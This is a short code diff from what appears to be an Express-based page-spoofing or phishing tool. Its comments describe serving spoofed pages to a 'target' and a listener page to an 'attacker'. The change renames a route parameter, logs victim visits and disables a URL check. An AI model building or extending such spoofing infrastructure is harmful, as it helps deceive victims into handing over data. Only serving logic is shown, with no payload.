@@ -55,11 +55,12 @@ app.use('/scripts', exp.static('scripts'))
 //* ROUTING
 
 //* SERVE SPOOF TO TARGET
-app.get('/:spoof_url', (req, res)=>{
+app.get('/:spoof_id', (req, res)=>{
+    log("SPOOF VISIT: " + req.params.spoof_id)
     // 404 on non existant spoof or invalid url
-    if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
-    if(!page_cache[req.params.spoof_url]) return res.sendStatus(404)
-    res.send(page_cache[req.params.spoof_url].rendered_page)
+    // if(!isURL(req.params.spoof_id)) return res.sendStatus(404)
+    if(!page_cache.pages[req.params.spoof_id]) return res.sendStatus(404)
+    res.send(page_cache.pages[req.params.spoof_id].rendered_page)
 })
 //* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
 app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
